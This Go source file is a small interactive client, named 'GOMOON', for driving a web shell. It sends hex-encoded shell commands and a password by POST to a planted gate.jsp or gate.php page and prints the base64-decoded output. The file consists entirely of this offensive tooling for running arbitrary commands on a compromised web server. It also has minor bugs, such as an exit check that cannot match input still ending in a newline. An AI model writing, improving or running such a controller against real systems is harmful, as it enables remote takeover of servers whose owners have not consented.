package main

import (
	"bufio"
	"encoding/base64"
	"encoding/hex"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

func main() {

	var url string
	var passwd string
	flag.StringVar(&url, "url", "http://127.0.0.1:8082/gate.jsp|gate.php", "url")
	flag.StringVar(&passwd, "passwd", "admin", "password")
	flag.Parse()
	flag.Usage = usage
	if flag.NFlag() != 2 {
		flag.Usage()
	}

	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print("# ")
		cmdString, err := reader.ReadString('\n')
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
		}

		if cmdString =="exit" {
			os.Exit(0)
		}

		err = runCommand(url, passwd ,cmdString)
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
		}
	}

}


func usage() {
	fmt.Fprintf(os.Stderr, `
                        <------------GOMOON------------>
		<---------WELCOME TO USE THIS PROGRAM--------->
		<---------v1.0 - Author - ACE86 --------->
		<---------Usage:   cmd  {xxx} -----Send a Command------>
		<---------Usage:   exit       -----     exit     ------>
`)
	flag.PrintDefaults()
}


func runCommand(url, passwd, commandStr string) error {
	var cmdBody  = "username="+hex.EncodeToString([]byte(commandStr)) +"&passwd="+hex.EncodeToString([]byte(passwd))
    Post(url,cmdBody)
	return nil

}


func Post(url , data string ) string {
	response, err := http.Post(url,
		"application/x-www-form-urlencoded",
		strings.NewReader(data))
	if err != nil {
		panic(err)
	}
	defer response.Body.Close()
	result, _ := ioutil.ReadAll(response.Body)

	//hexData, e := hex.DecodeString(string(result))

	hexData, e := base64.URLEncoding.DecodeString(string(result))

	if e !=nil {
		fmt.Println(e)
	}
	fmt.Println(string(hexData))

	fmt.Println(string(result))

	return string(result)

}
